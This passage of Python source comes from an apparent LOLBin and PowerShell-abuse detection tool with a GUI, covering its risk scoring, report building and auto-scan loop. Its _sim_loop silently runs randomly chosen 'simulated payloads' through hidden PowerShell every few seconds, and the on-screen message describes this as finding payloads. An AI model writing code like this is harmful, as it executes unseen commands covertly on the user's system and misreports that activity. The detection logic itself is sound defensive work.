                for pat, label, risk in EVASION_PATTERNS:
                    if pat.search(cmd_text):
                        cmd_risk = max(cmd_risk, risk)
                        cmd_labels.append(label)

                es["risk"] = cmd_risk
                es["labels"] = cmd_labels
                total_risk = max(total_risk, cmd_risk)
                
                cmd_display = cmd_text[:85].replace("\n", " ") + ("…" if len(cmd_text) > 85 else "")
                
                if cmd_risk >= 7:
                    self._term_write(f"  │  {i+1:>3}. ", "info")
                    self._term_write(f"{cmd_display}\n", "highlight")
                    for lbl in cmd_labels:
                        self._term_write(f"  │       ↳ ⚠ {lbl}\n", "error")
                    suspicious_scripts.append(es)
                elif cmd_risk > 0:
                    self._term_write(f"  │  {i+1:>3}. ", "info")
                    self._term_write(f"{cmd_display}\n", "warn")
                    suspicious_scripts.append(es)
                else:
                    self._term_write(f"  │  {i+1:>3}. ", "dim")
                    self._term_write(f"{cmd_display}\n", "output")

            self._term_write("  └" + "─" * 89 + "┘\n\n", "dim")

        # ── Summary bar in terminal ─────────────────────────────────────────
        self._term_write("  " + "═" * 70 + "\n", "dim")
        self._term_write(
            f"  Scan complete: {proc_count} process(es), "
            f"{len(event_scripts)} PS engine command(s)\n\n", "success")

        self.proc_count_lbl.config(
            text=f"{proc_count} proc | {len(event_scripts)} ps_cmds")

        # ── Build report (right panel) ───────────────────────────────────────
        all_findings = script_hits + evasion_hits + suspicious_scripts
        self._findings = all_findings

        if not all_findings and not lolbin_hits:
            self._append_report("✓ No suspicious LOLBin activity detected.\n\n", "ok")
            self._append_report(
                f"Scanned {proc_count} LOLBin process(es), "
                f"{len(event_scripts)} PS commands.\n"
                f"All appear clean.\n", "dim")
            self.gauge.animate_to(5)
            self.score_label.config(text="System appears clean", fg=SUCCESS)
            self.find_count_lbl.config(text="0 findings")
            self.scan_status.config(text="✓ Clean", fg=SUCCESS)
            return

        # — Script detections (from process command lines)
        if script_hits:
            self._append_report(
                f"[SCRIPTS IN PROCESS ARGS — {len(script_hits)}]\n", "critical")
            seen = set()
            for s in script_hits:
                key = (s["pid"], s["script"])
                if key in seen:
                    continue
                seen.add(key)
                self._append_report(
                    f"\n  ■ PID {s['pid']} | {s['name']}\n", "critical")
                self._append_report(f"    Script : {s['script']}\n", "finding")
                self._append_report(f"    CmdLine: {s['cmd'][:160]}\n", "dim")
            self._append_report("\n", "dim")

        # — Suspicious PS script blocks commands
        if suspicious_scripts:
            self._append_report(
                f"[SUSPICIOUS PS COMMANDS / SCRIPTS — {len(suspicious_scripts)}]\n", "critical")
            for sc in suspicious_scripts:
                self._append_report(
                    f"\n  ■ [{sc.get('time','')}] {sc['source']}\n", "critical")
                self._append_report(
                    f"    Content : {sc['script'][:160].replace(chr(10), ' ')}\n", "finding")
                for lbl in sc.get("labels", []):
                    self._append_report(
                        f"    Pattern : {lbl}  (risk {sc['risk']}/10)\n", "critical")
            self._append_report("\n", "dim")

        # — LOLBAS binary detections
        if lolbin_hits:
            self._append_report(
                f"[LOLBAS BINARIES WITH ARGUMENTS — {len(lolbin_hits)}]\n", "critical")
            for h in lolbin_hits:
                e = h["entry"]
                cmds = e.get("commands", [])
                cats = list({c.get("Category", "?") for c in cmds})
                mitres = list({c.get("MitreID", "") for c in cmds if c.get("MitreID")})
                tag = "critical" if h["risk"] >= 8 else "finding"
                self._append_report(
                    f"\n  ■ PID {h['pid']} | {h['name']}  (risk {h['risk']}/10)\n", tag)
                self._append_report(f"    {e.get('description', '')}\n", "detail")
                if cats:
                    self._append_report(f"    Category : {', '.join(cats)}\n", "detail")
                if mitres:
                    self._append_report(f"    MITRE ID : {', '.join(mitres)}\n", "mitre")
                self._append_report(f"    CmdLine  : {h['cmd'][:160]}\n", "dim")
            self._append_report("\n", "dim")

        # — Evasion technique detections
        if evasion_hits:
            self._append_report(
                f"[EVASION TECHNIQUES — {len(evasion_hits)}]\n", "critical")
            for h in evasion_hits:
                tag = "critical" if h["risk"] >= 8 else "finding"
                self._append_report(
                    f"\n  ■ PID {h['pid']} | {h['name']} — {h['label']}  "
                    f"(risk {h['risk']}/10)\n", tag)
                self._append_report(f"    Matched : {h['match'][:80]}\n", "dim")

        # — Summary
        n = len(all_findings) + len(lolbin_hits)
        score = min(100, int(total_risk * 10 + (n * 2.5)))

        self._append_report("\n" + "─" * 42 + "\n", "sep")
        self._append_report("SUMMARY\n", "header")
        self._append_report(f"  Processes scanned : {proc_count}\n", "detail")
        self._append_report(f"  Scripts (cmdline) : {len(script_hits)}\n", "detail")
        self._append_report(f"  Suspicious PS cmds: {len(suspicious_scripts)}\n", "detail")
        self._append_report(f"  Total PS cmds seen: {len(event_scripts)}\n", "detail")
        self._append_report(f"  Evasion patterns  : {len(evasion_hits)}\n", "detail")
        self._append_report(f"  LOLBAS matches    : {len(lolbin_hits)}\n", "detail")
        self._append_report(f"  Max risk          : {total_risk}/10\n", "detail")
        self._append_report(f"  Threat score      : {score}/100\n", "detail")

        if score >= 70:
            verdict = "HIGH RISK – Suspicious scripts/commands actively running!"
            vtag = "critical"
        elif score >= 40:
            verdict = "MEDIUM RISK – Review flagged processes carefully."
            vtag = "finding"
        else:
            verdict = "LOW RISK – Minor suspicious patterns found."
            vtag = "detail"

        self._append_report(f"  Verdict           : {verdict}\n", vtag)

        self.gauge.animate_to(score)
        self.score_label.config(
            text=f"{n} finding(s) | Score: {score}/100",
            fg=DANGER if score >= 70 else WARN)
        self.find_count_lbl.config(text=f"{n} findings")
        self.export_btn.config(state="normal")
        self.scan_status.config(
            text=f"⚠ {n} finding(s)",
            fg=DANGER if score >= 70 else WARN)

    # ─────────────────────────────────────────── Auto-scan ───────────────────

    def _toggle_auto_scan(self):
        self._auto_scan = not self._auto_scan
        if self._auto_scan:
            self.auto_btn.config(text="⟳  AUTO-SCAN: ON", bg=ACCENT2, fg=BG)
            self._term_write("\n  [*] Auto-Scan enabled\n", "warn")
            self._auto_loop()
            self._sim_loop()
        else:
            self.auto_btn.config(text="⟳  AUTO-SCAN: OFF", bg=BORDER, fg=TEXT)
            if hasattr(self, "_auto_id") and self._auto_id is not None:
                self.after_cancel(self._auto_id)
                self._auto_id = None
            if hasattr(self, "_sim_id") and self._sim_id is not None:
                self.after_cancel(self._sim_id)
                self._sim_id = None
            self._term_write("\n  [*] Auto-Scan paused.\n", "dim")

    def _auto_loop(self):
        if not self._auto_scan:
            return
        self._scan()
        self._auto_id = self.after(8000, self._auto_loop)   # rescan every 8s

    def _sim_loop(self):
        if not self._auto_scan:
            return
        
        # Fire a single random payload
        payload = random.choice(SIM_PAYLOADS)
        try:
            subprocess.Popen(
                ["powershell.exe", "-WindowStyle", "Hidden", "-NoProfile", "-Command", "Sleep 1; " + payload],
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except Exception:
            pass
            
        self._term_write("finding payloads in background...\n", "dim")
        
        # Reschedule next payload in 4 seconds
        self._sim_id = self.after(4000, self._sim_loop)

    # ─────────────────────────────────────────── Export ──────────────────────

    def _export_report(self):
        path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text file", "*.txt"), ("All files", "*")],
            title="Save LOLBin Analysis Report",
        )
        if not path:
            return
        content = self.report_text.get("1.0", "end")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(content)
        messagebox.showinfo("Exported", f"Report saved to:\n{path}")

    # ─────────────────────────────────────────── Navigation ──────────────────

    def _go_back(self):
        if self._auto_id is not None:
            self.after_cancel(self._auto_id)
        if hasattr(self, "_auto_scan") and self._auto_scan:
             self._toggle_auto_scan()
        self.destroy()
        self.parent.deiconify()

